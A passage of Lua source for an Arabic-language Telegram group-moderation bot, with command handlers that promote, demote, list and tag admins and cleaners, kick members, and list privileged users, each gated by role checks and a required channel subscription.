send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," 𖥔 عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id..'moall'..msg.chat_id_, result.id_)
usertext = '\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n 𖥔 تم ترقيته ادمن عام'
texts = usertext..status
else
texts = ' 𖥔 لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end 

if text and text:match("^رفع ادمن عام (%d+)$") and Constructor(msg) then
local userid = text:match("^رفع ادمن عام (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:sadd(bot_id..'moall'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم ترقيته ادمن عام'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n 𖥔 الـعـضو   ↚ '..userid..''
status  = '\n 𖥔 تم ترقيته ادمن عام'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end  
if text == ("تنزيل ادمن عام") and msg.reply_to_message_id_ and Constructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'moall'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيله من الادمنه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end  
if text and text:match("^تنزيل ادمن عام @(.*)$") and Constructor(msg) then
local username = text:match("^تنزيل ادمن عام @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'moall'..msg.chat_id_, result.id_)
usertext = '\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيله من الادمنه'
texts = usertext..status
else
texts = ' 𖥔 لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end  
if text and text:match("^تنزيل ادمن عام (%d+)$") and Constructor(msg) then
local userid = text:match("^تنزيل ادمن عام (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'moall'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيله من الادمنه'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n 𖥔 الـعـضو   ↚ '..userid..''
status  = '\n 𖥔 تم تنزيله من الادمنه'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
------------------------------------------------------------------------
if text ==("رفع الادمنيه") and Manager(msg) then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local num2 = 0
local admins = data.members_
for i=0 , #admins do
if data.members_[i].bot_info_ == false and data.members_[i].status_.ID == "ChatMemberStatusEditor" then
database:sadd(bot_id.."Mod:User"..msg.chat_id_, admins[i].user_id_)
num2 = num2 + 1
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,b) 
if b.username_ == true then
end
if b.first_name_ == false then
database:srem(bot_id.."Mod:User"..msg.chat_id_, admins[i].user_id_)
end
end,nil)   
else
database:srem(bot_id.."Mod:User"..msg.chat_id_, admins[i].user_id_)
end
end
if num2 == 0 then
send(msg.chat_id_, msg.id_," 𖥔 لا يوجد ادمنيه ليتم رفعهم") 
else
send(msg.chat_id_, msg.id_," 𖥔 تمت ترقيه { "..num2.." } من الادمنيه") 
end
end,nil)   
end
if text == 'مسح الادمنيه' and Manager(msg) then
database:del(bot_id..'Mod:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 𖥔 تم مسح الادمنيه')
end
if text == ("الادمنيه") and Manager(msg) then
local list = database:smembers(bot_id..'Mod:User'..msg.chat_id_)
t = "\n 𖥔 قائمة الادمنيه \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " 𖥔 لا يوجد ادمنيه"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("تاك للادمنيه") or text == ("صيح الادمنيه") then
local list = database:smembers(bot_id..'Mod:User'..msg.chat_id_)
t = "\n 𖥔 وينكم تعالو يريدوكم بالجروب \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- {[@"..username.."]}\n"
else
t = t..""..k.."- 「 '..v..' 」\n"
end
end
if #list == 0 then
t = " 𖥔 لا يوجد ادمنيه"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("رفع ادمن") and msg.reply_to_message_id_ and Manager(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' 𖥔 تم تعطيل الرفع') 
return false
end
database:sadd(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم ترقيته ادمن'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع ادمن @(.*)$") and Manager(msg) then
local username = text:match("^رفع ادمن @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' 𖥔 تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," 𖥔 عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id..'Mod:User'..msg.chat_id_, result.id_)
usertext = '\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n 𖥔 تم ترقيته ادمن'
texts = usertext..status
else
texts = ' 𖥔 لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^رفع ادمن (%d+)$") and Manager(msg) then
local userid = text:match("^رفع ادمن (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' 𖥔 تم تعطيل الرفع') 
return false
end
database:sadd(bot_id..'Mod:User'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم ترقيته ادمن'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n 𖥔 الـعـضو   ↚ '..userid..''
status  = '\n 𖥔 تم ترقيته ادمن'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("تنزيل ادمن") and msg.reply_to_message_id_ and Manager(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيله من الادمنيه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل ادمن @(.*)$") and Manager(msg) then
local username = text:match("^تنزيل ادمن @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.id_)
usertext = '\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيله من الادمنيه'
texts = usertext..status
else
texts = ' 𖥔 لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^تنزيل ادمن (%d+)$") and Manager(msg) then
local userid = text:match("^تنزيل ادمن (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'Mod:User'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيله من الادمنيه'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n 𖥔 الـعـضو   ↚ '..userid..''
status  = '\n 𖥔 تم تنزيله من الادمنيه'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == 'مسح المنظفين' and BasicConstructor(msg) then
database:del(bot_id..'banda:MN:TF'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 𖥔 تم مسح المنظفين')
end
if text == ("المنظفين") and BasicConstructor(msg) then
local list = database:smembers(bot_id..'banda:MN:TF'..msg.chat_id_)
t = "\n 𖥔 قائمة المنظفين \n━━━━━━𝓓𝓡𝓖━━━━━━\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " 𖥔 لا يوجد المنظفين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("تاك للمنظفين") or text == ("صيح المنظفين") then
local list = database:smembers(bot_id..'banda:MN:TF'..msg.chat_id_)
t = "\n 𖥔 وينكم تعالو يريدوكم بالجروب \n━━━━━━𝓓𝓡𝓖━━━━━━\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- {[@"..username.."]}\n"
else
t = t..""..k.."- 「 '..v..' 」\n"
end
end
if #list == 0 then
t = " 𖥔 لا يوجد منظفيه"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("رفع منظف") and msg.reply_to_message_id_ and BasicConstructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not BasicConstructor(msg) then
send(msg.chat_id_, msg.id_,' 𖥔 تم تعطيل الرفع') 
return false
end
database:sadd(bot_id..'banda:MN:TF'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم ترقيته منظف'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع منظف @(.*)$") and BasicConstructor(msg) then
local username = text:match("^رفع منظف @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not BasicConstructor(msg) then
send(msg.chat_id_, msg.id_,' 𖥔 تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," 𖥔 عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id..'banda:MN:TF'..msg.chat_id_, result.id_)
usertext = '\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n 𖥔 تم ترقيته منظف'
texts = usertext..status
else
texts = ' 𖥔 لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^رفع منظف (%d+)$") and BasicConstructor(msg) then
local userid = text:match("^رفع منظف (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not BasicConstructor(msg) then
send(msg.chat_id_, msg.id_,' 𖥔 تم تعطيل الرفع') 
return false
end
database:sadd(bot_id..'banda:MN:TF'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم ترقيته منظف'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n 𖥔 الـعـضو   ↚ '..userid..''
status  = '\n 𖥔 تم ترقيته منظف'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("تنزيل منظف") and msg.reply_to_message_id_ and BasicConstructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'banda:MN:TF'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيله من المنظفين'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل منظف @(.*)$") and BasicConstructor(msg) then
local username = text:match("^تنزيل منظف @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'banda:MN:TF'..msg.chat_id_, result.id_)
usertext = '\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيله من المنظفين'
texts = usertext..status
else
texts = ' 𖥔 لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^تنزيل منظف (%d+)$") and BasicConstructor(msg) then
local userid = text:match("^تنزيل منظف (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'banda:MN:TF'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيله من المنظفين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n 𖥔 الـعـضو   ↚ '..userid..''
status  = '\n 𖥔 تم تنزيله من المنظفين'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
------------------------------------------------------------------------
if text == ("طرد") and msg.reply_to_message_id_ ~=0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' 𖥔 تم تعطيل الطرد') 
return false
end
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " 𖥔 لا تسطيع طرد البوت ")
return false 
end
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n 𖥔 عذرا لا تستطيع طرد ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,' 𖥔  ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' 𖥔 البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
statusk  = '\n 𖥔 تم طرد الـعـضو '
send(msg.chat_id_, msg.id_, usertext..statusk)
end,nil)
chat_kick(result.chat_id_, result.sender_user_id_)
end,nil)   
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end  
if text and text:match("^طرد @(.*)$") and Mod(msg) then 
local username = text:match("^طرد @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' 𖥔 تم تعطيل الطرد') 
return false
end
function start_function(extra, result, success)
if result.id_ then
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " 𖥔 لا تسطيع طرد البوت ")
return false 
end
if Can_or_NotCan(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n 𖥔 عذرا لا تستطيع طرد ( '..Rutba(result.id_,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⚠| عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,' 𖥔  ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' 𖥔 البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
usertext = '\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
statusk  = '\n 𖥔 تم طرد الـعـضو '
texts = usertext..statusk
chat_kick(msg.chat_id_, result.id_)
send(msg.chat_id_, msg.id_, texts)
end,nil)   
end
else
send(msg.chat_id_, msg.id_, ' 𖥔 لا يوجد حساب بهاذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end  

if text and text:match("^طرد (%d+)$") and Mod(msg) then 
local userid = text:match("^طرد (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' 𖥔 تم تعطيل الطرد') 
return false
end
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " 𖥔 لا تسطيع طرد البوت ")
return false 
end
if Can_or_NotCan(userid, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n 𖥔 عذرا لا تستطيع طرد ( '..Rutba(userid,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = userid, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,' 𖥔 ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' 𖥔 البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
chat_kick(msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
 usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
 statusk  = '\n 𖥔 تم طرد الـعـضو '
send(msg.chat_id_, msg.id_, usertext..statusk)
else
 usertext = '\n 𖥔 الـعـضو   ↚ '..userid..''
 statusk  = '\n 𖥔 تم طرد الـعـضو '
send(msg.chat_id_, msg.id_, usertext..statusk)
end;end,nil)
end,nil)   
end
return false
end
------------------------------------------------------------------------
------------------------------------------------------------------------
if text == 'مسح المميزين' and Mod(msg) then
database:del(bot_id..'Special:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 𖥔 تم مسح المميزين')
end
if text == ("المميزين") and Mod(msg) then
local list = database:smembers(bot_id..'Special:User'..msg.chat_id_)
t = "\n 𖥔 قائمة مميزين الجروب \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " 𖥔 لا يوجد مميزين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("تاك للمميزين") or text == ("صيح المميزين") then
local list = database:smembers(bot_id..'Special:User'..msg.chat_id_)
